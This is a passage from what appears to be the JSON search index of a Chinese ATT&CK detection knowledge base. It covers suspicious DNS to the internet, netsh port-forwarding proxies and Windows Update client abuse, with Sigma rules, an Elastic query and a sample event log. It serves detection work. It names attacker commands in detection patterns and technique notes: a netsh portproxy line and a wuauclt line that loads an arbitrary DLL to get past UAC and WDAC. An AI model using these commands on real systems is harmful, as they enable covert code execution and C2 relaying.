3d1\u9001\u5230\u516c\u7f51\u4e0a\u3002\u5bf9\u4e8e\u6258\u7ba1\u7f51\u7edc\u6765\u8bf4\uff0c\u8fd9\u662f\u975e\u5178\u578b\u7684\u884c\u4e3a\uff0c\u5e76\u4e14\u53ef\u4ee5\u6307\u793a\u6076\u610f\u8f6f\u4ef6\uff0c\u6e17\u900f\uff0c\u547d\u4ee4\u548c\u63a7\u5236\uff0c\u6216\u8005\u7b80\u5355\u5730\u6307\u51fa\u914d\u7f6e\u9519\u8bef\u3002\u6b64DNS\u6d3b\u52a8\u8fd8\u4f1a\u5f71\u54cd\u60a8\u7684\u7ec4\u7ec7\u63d0\u4f9b\u4f01\u4e1a\u76d1\u89c6\u548cDNS\u65e5\u5fd7\u8bb0\u5f55\u7684\u80fd\u529b\uff0c\u5e76\u4f7f\u60a8\u7684\u7f51\u7edc\u5bb9\u6613\u906d\u53d7\u5404\u79cd\u6ee5\u7528\u548c\u6076\u610f\u901a\u4fe1\u3002 \u53c2\u8003\u6587\u732e\uff1a https://www.us-cert.gov/ncas/alerts/TA15-240A https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81-2.pdf","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_2","text":"Network","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#sigma","text":"title: \u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a description: \u901a\u8fc7\u7f51\u7edc\u6d41\u91cf\u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a tags: T1071\u3002004 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/dns-activity-to-the-internet.html logsource: product: network detection: selection1: destination.port: 53 selection2: source.ip: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 slection3: destination.ip: - 10.0.0.0/8 - 127.0.0.0/8 - 169.254.169.254/32 - 172.16.0.0/12 - 192.168.0.0/16 - 224.0.0.251 - 224.0.0.252 - ::1 - 255.255.255.255 - ff02::fb condition: selection1 and not selection2 level: medium","title":"sigma\u89c4\u5219"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#elastic-rule-query","text":"destination.port:53 and source.ip:(10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) and not destination.ip:(10.0.0.0/8 or 127.0.0.0/8 or 169.254.169.254/32 or 172.16.0.0/12 or 192.168.0.0/16 or 224.0.0.251 or 224.0.0.252 or 255.255.255.255 or \"::1\" or \"ff02::fb\")","title":"Elastic rule query"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_6","text":"\u4ece\u8fd9\u6761\u89c4\u5219\u4e2d\u6392\u9664DNS\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\u3002\u7aef\u70b9\u901a\u5e38\u67e5\u8be2\u5728\u5176DHCP\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\u7684\u672c\u5730DNS\u670d\u52a1\u5668\uff0c\u4f46\u662f\u5982\u679c\u7528\u6237\u5c06\u5176\u7aef\u70b9\u914d\u7f6e\u4e3a\u4f7f\u7528\u8fdc\u7a0bDNS\u670d\u52a1\u5668\uff0c\u5219\u53ef\u4ee5\u8986\u76d6\u8be5\u7aef\u70b9\u3002\u8fd9\u5728\u53d7\u7ba1\u4f01\u4e1a\u7f51\u7edc\u4e2d\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u4e3a\u4f7f\u7528\u6c34\u5e73\u5206\u5272DNS\u53ef\u80fd\u4f1a\u7834\u574fIntranet\u540d\u79f0\u89e3\u6790\u3002\u67d0\u4e9b\u6d88\u8d39\u8005VPN\u670d\u52a1\u548c\u6d4f\u89c8\u5668\u63d2\u4ef6\u53ef\u80fd\u4f1a\u5c06DNS\u6d41\u91cf\u53d1\u9001\u5230\u8fdc\u7a0bInternet\u76ee\u7684\u5730\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\u65f6\uff0c\u53ef\u4ee5\u4ece\u6b64\u89c4\u5219\u4e2d\u6392\u9664\u6b64\u7c7b\u8bbe\u5907\u6216\u7f51\u7edc\u3002","title":"\u5efa\u8bae"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_7","text":"MITRE-ATT&CK-T1071.004 https://attack.mitre.org/techniques/T1071/004/ \u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a https://www.elastic.co/guide/en/siem/guide/current/dns-activity-to-the-internet.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/","text":"T1090-001-win-\u94fe\u63a5\u4ee3\u7406 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fde\u63a5\u4ee3\u7406\u5728\u7cfb\u7edf\u4e4b\u95f4\u5b9a\u5411\u7f51\u7edc\u6d41\u91cf\uff0c\u6216\u8005\u5145\u5f53\u4e0e\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668\u8fdb\u884c\u7f51\u7edc\u901a\u4fe1\u7684\u4e2d\u4ecb\uff0c\u4ee5\u907f\u514d\u76f4\u63a5\u8fde\u63a5\u81f3\u5176\u57fa\u7840\u7ed3\u6784\u3002\u5b58\u5728\u8bb8\u591a\u542f\u7528\u4ee3\u7406\u6216\u7aef\u53e3\u91cd\u5b9a\u5411\u7684\u6d41\u91cf\u91cd\u5b9a\u5411\u7684\u5de5\u5177\uff0c\u5305\u62ecHTRAN\uff0cZXProxy\u548cZXPortMap\u3002\u653b\u51fb\u8005\u4f7f\u7528\u8fd9\u4e9b\u7c7b\u578b\u7684\u4ee3\u7406\u6765\u7ba1\u7406\u547d\u4ee4\u548c\u63a7\u5236\u901a\u4fe1\uff0c\u51cf\u5c11\u540c\u65f6\u51fa\u7ad9\u7f51\u7edc\u8fde\u63a5\u7684\u6570\u91cf\uff0c\u9762\u5bf9\u8fde\u63a5\u4e22\u5931\u65f6\u63d0\u4f9b\u5f39\u6027\u6216\u5728\u53d7\u5bb3\u8005\u4e4b\u95f4\u8d8a\u8fc7\u73b0\u6709\u7684\u53d7\u4fe1\u4efb\u901a\u4fe1\u8def\u5f84\u4ee5\u907f\u514d\u6000\u7591\u3002 \u5916\u90e8\u8fde\u63a5\u4ee3\u7406\u7528\u4e8e\u63a9\u76d6C2\u6d41\u91cf\u7684\u76ee\u7684\u5730\uff0c\u901a\u5e38\u4f7f\u7528\u7aef\u53e3\u91cd\u5b9a\u5411\u5668\u5b9e\u73b0\u3002\u53d7\u5bb3\u73af\u5883\u4e4b\u5916\u7684\u53d7\u635f\u7cfb\u7edf\u4ee5\u53ca\u5df2\u8d2d\u4e70\u7684\u57fa\u7840\u7ed3\u6784\uff08\u5982\u57fa\u4e8e\u4e91\u7684\u8d44\u6e90\u6216\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u90fd\u53ef\u4ee5\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\u3002\u53ef\u4ee5\u57fa\u4e8e\u5bf9\u4ece\u53d7\u611f\u67d3\u7cfb\u7edf\u5230\u4ee3\u7406\u7684\u8fde\u63a5\u8fdb\u884c\u8c03\u67e5\u7684\u53ef\u80fd\u6027\u5f88\u5c0f\u7684\u53ef\u80fd\u6027\u6765\u9009\u62e9\u4ee3\u7406\u3002\u53d7\u5bb3\u8005\u7cfb\u7edf\u5c06\u76f4\u63a5\u4e0eInternet\u4e0a\u7684\u5916\u90e8\u4ee3\u7406\u8fdb\u884c\u901a\u4fe1\uff0c\u7136\u540e\u8be5\u4ee3\u7406\u4f1a\u5c06\u901a\u4fe1\u8f6c\u53d1\u5230C2\u670d\u52a1\u5668\u3002 \u5185\u90e8\u8fde\u63a5\u4ee3\u7406\u53ef\u7528\u4e8e\u5408\u5e76\u6765\u81ea\u53d7\u611f\u67d3\u7cfb\u7edf\u7684\u5185\u90e8\u8fde\u63a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f7f\u7528\u53d7\u635f\u7684\u5185\u90e8\u7cfb\u7edf\u4f5c\u4e3a\u4ee3\u7406\uff0c\u4ee5\u9690\u85cfC2\u6d41\u91cf\u7684\u771f\u5b9e\u76ee\u7684\u5730\u3002\u4ee3\u7406\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ece\u7f51\u7edc\u5185\u90e8\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u91cd\u5b9a\u5411\u5230\u5916\u90e8C2\u670d\u52a1\u5668\uff0c\u4ece\u800c\u96be\u4ee5\u53d1\u73b0\u6076\u610f\u6d41\u91cf\u3002\u53e6\u5916\uff0c\u8be5\u7f51\u7edc\u53ef\u7528\u4e8e\u5c06\u4fe1\u606f\u4ece\u4e00\u4e2a\u7cfb\u7edf\u4e2d\u7ee7\u5230\u53e6\u4e00\u4e2a\u7cfb\u7edf\uff0c\u4ee5\u907f\u514d\u5c06\u6d41\u91cf\u5e7f\u64ad\u5230\u6240\u6709\u7cfb\u7edf\u3002 \u6d4b\u8bd5\u6848\u4f8b \u672c\u6848\u4f8b\u4e3b\u8981\u6a21\u62dfwindows\u5229\u7528netsh\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u4e8b\u4ef6ID\uff0c\u8fdb\u7a0b\uff0c\u547d\u4ee4\u884c\u53c2\u6570\u7b49\u4fe1\u606f\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: netsh\u7aef\u53e3\u8f6c\u53d1 description: windows server 2016 tags: T1090-001 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\netsh.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: \"netsh interface portproxy add v4tov4 *\" #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 condition: selection level: medium \u5efa\u8bae \u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1090-001 https://attack.mitre.org/techniques/T1090/001 \u5982\u4f55\u5728Windows\u4e2d\u4f7f\u7528netsh\u547d\u4ee4\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1 https://www.freebuf.com/articles/system/176889.html","title":"T1090-001-win-\u94fe\u63a5\u4ee3\u7406"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#t1090-001-win-","text":"","title":"T1090-001-win-\u94fe\u63a5\u4ee3\u7406"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fde\u63a5\u4ee3\u7406\u5728\u7cfb\u7edf\u4e4b\u95f4\u5b9a\u5411\u7f51\u7edc\u6d41\u91cf\uff0c\u6216\u8005\u5145\u5f53\u4e0e\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668\u8fdb\u884c\u7f51\u7edc\u901a\u4fe1\u7684\u4e2d\u4ecb\uff0c\u4ee5\u907f\u514d\u76f4\u63a5\u8fde\u63a5\u81f3\u5176\u57fa\u7840\u7ed3\u6784\u3002\u5b58\u5728\u8bb8\u591a\u542f\u7528\u4ee3\u7406\u6216\u7aef\u53e3\u91cd\u5b9a\u5411\u7684\u6d41\u91cf\u91cd\u5b9a\u5411\u7684\u5de5\u5177\uff0c\u5305\u62ecHTRAN\uff0cZXProxy\u548cZXPortMap\u3002\u653b\u51fb\u8005\u4f7f\u7528\u8fd9\u4e9b\u7c7b\u578b\u7684\u4ee3\u7406\u6765\u7ba1\u7406\u547d\u4ee4\u548c\u63a7\u5236\u901a\u4fe1\uff0c\u51cf\u5c11\u540c\u65f6\u51fa\u7ad9\u7f51\u7edc\u8fde\u63a5\u7684\u6570\u91cf\uff0c\u9762\u5bf9\u8fde\u63a5\u4e22\u5931\u65f6\u63d0\u4f9b\u5f39\u6027\u6216\u5728\u53d7\u5bb3\u8005\u4e4b\u95f4\u8d8a\u8fc7\u73b0\u6709\u7684\u53d7\u4fe1\u4efb\u901a\u4fe1\u8def\u5f84\u4ee5\u907f\u514d\u6000\u7591\u3002 \u5916\u90e8\u8fde\u63a5\u4ee3\u7406\u7528\u4e8e\u63a9\u76d6C2\u6d41\u91cf\u7684\u76ee\u7684\u5730\uff0c\u901a\u5e38\u4f7f\u7528\u7aef\u53e3\u91cd\u5b9a\u5411\u5668\u5b9e\u73b0\u3002\u53d7\u5bb3\u73af\u5883\u4e4b\u5916\u7684\u53d7\u635f\u7cfb\u7edf\u4ee5\u53ca\u5df2\u8d2d\u4e70\u7684\u57fa\u7840\u7ed3\u6784\uff08\u5982\u57fa\u4e8e\u4e91\u7684\u8d44\u6e90\u6216\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u90fd\u53ef\u4ee5\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\u3002\u53ef\u4ee5\u57fa\u4e8e\u5bf9\u4ece\u53d7\u611f\u67d3\u7cfb\u7edf\u5230\u4ee3\u7406\u7684\u8fde\u63a5\u8fdb\u884c\u8c03\u67e5\u7684\u53ef\u80fd\u6027\u5f88\u5c0f\u7684\u53ef\u80fd\u6027\u6765\u9009\u62e9\u4ee3\u7406\u3002\u53d7\u5bb3\u8005\u7cfb\u7edf\u5c06\u76f4\u63a5\u4e0eInternet\u4e0a\u7684\u5916\u90e8\u4ee3\u7406\u8fdb\u884c\u901a\u4fe1\uff0c\u7136\u540e\u8be5\u4ee3\u7406\u4f1a\u5c06\u901a\u4fe1\u8f6c\u53d1\u5230C2\u670d\u52a1\u5668\u3002 \u5185\u90e8\u8fde\u63a5\u4ee3\u7406\u53ef\u7528\u4e8e\u5408\u5e76\u6765\u81ea\u53d7\u611f\u67d3\u7cfb\u7edf\u7684\u5185\u90e8\u8fde\u63a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f7f\u7528\u53d7\u635f\u7684\u5185\u90e8\u7cfb\u7edf\u4f5c\u4e3a\u4ee3\u7406\uff0c\u4ee5\u9690\u85cfC2\u6d41\u91cf\u7684\u771f\u5b9e\u76ee\u7684\u5730\u3002\u4ee3\u7406\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ece\u7f51\u7edc\u5185\u90e8\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u91cd\u5b9a\u5411\u5230\u5916\u90e8C2\u670d\u52a1\u5668\uff0c\u4ece\u800c\u96be\u4ee5\u53d1\u73b0\u6076\u610f\u6d41\u91cf\u3002\u53e6\u5916\uff0c\u8be5\u7f51\u7edc\u53ef\u7528\u4e8e\u5c06\u4fe1\u606f\u4ece\u4e00\u4e2a\u7cfb\u7edf\u4e2d\u7ee7\u5230\u53e6\u4e00\u4e2a\u7cfb\u7edf\uff0c\u4ee5\u907f\u514d\u5c06\u6d41\u91cf\u5e7f\u64ad\u5230\u6240\u6709\u7cfb\u7edf\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_1","text":"\u672c\u6848\u4f8b\u4e3b\u8981\u6a21\u62dfwindows\u5229\u7528netsh\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_4","text":"\u4e8b\u4ef6ID\uff0c\u8fdb\u7a0b\uff0c\u547d\u4ee4\u884c\u53c2\u6570\u7b49\u4fe1\u606f\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#sigma","text":"title: netsh\u7aef\u53e3\u8f6c\u53d1 description: windows server 2016 tags: T1090-001 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\netsh.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: \"netsh interface portproxy add v4tov4 *\" #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_6","text":"\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u5efa\u8bae"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_7","text":"MITRE-ATT&CK-T1090-001 https://attack.mitre.org/techniques/T1090/001 \u5982\u4f55\u5728Windows\u4e2d\u4f7f\u7528netsh\u547d\u4ee4\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1 https://www.freebuf.com/articles/system/176889.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/","text":"T1105-Windows Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f\u884c\u4e3a\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u6216\u5176\u4ed6\u6587\u4ef6\u4ece\u5916\u90e8\u7cfb\u7edf\u8f6c\u79fb\u5230\u88ab\u653b\u9677\u7684\u73af\u5883\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u4ece\u5916\u90e8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\u4e2d\u590d\u5236\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5c06\u5de5\u5177\u5e26\u5165\u88ab\u653b\u9677\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u6216\u901a\u8fc7\u4e0e\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u5982FTP\uff09\u7684\u66ff\u4ee3\u534f\u8bae\u590d\u5236\u6587\u4ef6\u3002\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5728Mac\u548cLinux\u4e0a\u4f7f\u7528scp\u3001rsync\u548csftp\u7b49\u672c\u673a\u5de5\u5177\u8fdb\u884c\u590d\u5236\u3002 \u6d4b\u8bd5\u6848\u4f8b \u63f4\u5f15\u5916\u5a92Bleeping Computer\u62a5\u9053\uff0cMDSec\u7814\u7a76\u4eba\u5458David Middlehurst\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u884c\u9009\u9879\u4ece\u4efb\u610f\u7279\u5236\u7684DLL\u52a0\u8f7dwuauclt\uff0c\u4ece\u800c\u5728Windows 10\u7cfb\u7edf\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801\uff1a wuauclt.exe /UpdateDeploymentProvider [path_to_dll] /RunHandlerComServer \u8be5\u6280\u5de7\u7ed5\u8fc7Windows\u7528\u6237\u5e10\u6237\u63a7\u5236\uff08UAC\uff09\u6216Windows Defender\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\uff08WDAC\uff09\uff0c\u53ef\u7528\u4e8e\u5728\u5df2\u7ecf\u53d7\u5230\u5a01\u80c1\u7684\u7cfb\u7edf\u4e0a\u83b7\u5f97\u6301\u4e45\u6027\u3002\u4e4b\u6240\u4ee5\u80fd\u591f\u53d1\u73b0\uff0c\u662f\u56e0\u4e3a\u4ed6\u53d1\u73b0\u5df2\u7ecf\u6709\u9ed1\u5ba2\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u6267\u884c\u653b\u51fb\u884c\u4e3a\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7\u3001\u5176\u4ed6EDR\u7c7b\u4ea7\u54c1 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 SourceSecurity LevelError DescriptionA new process has been created. Creator Subject: Security ID: SYSTEM Account Name: - Account Domain: - Logon ID: 0x3E7 Target Subject: Security ID: NULL SID Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x7b4 New Process Name: C:\\Windows\\System32\\lsass.exe Token Elevation Type: %%1936 Mandatory Label: Mandatory Label\\System Mandatory Level Creator Process ID: 0x71c Creator Process Name: C:\\Windows\\System32\\wininit.exe Process Command Line: #\u9700\u8981\u5355\u72ec\u914d\u7f6e\uff0c\u5f00\u542f Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy. Type 1 is a full token with no privileges removed or groups disabled. A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account. \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Windows Update Client\u6ee5\u7528\u68c0\u6d4b status: experimental description: Detects code execution via the Windows Update client (wuauclt) references: - https://www.nruan.com/75037.html tags: - attack.command_and_control - attack.execution - attack.t1105 - attack.t1218 logsource: product: windows #windows service: process_creation #\u5b89\u5168\u4e8b\u4ef6\uff0c\u8fdb\u7a0b\u521b\u5efa detection: selection: ProcessCommandline|contains|all: #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u5305\u542b\u4ee5\u4e0b\u4efb\u610f\u4e00\u9879 - '/UpdateDeploymentProvider' - '/RunHandlerComServer' Image|endswith: - '\\wuauclt.exe' #\u8fdb\u7a0b\u8def\u5f84\u4e3a\u4ee5wuauclt.exe condition: selection falsepositives: - Unknown level: high \u5efa\u8bae \u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1105 https://attack.mitre.org/techniques/T1105 Windows Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f https://www.nruan.com/75037.html","title":"T1105-Windows 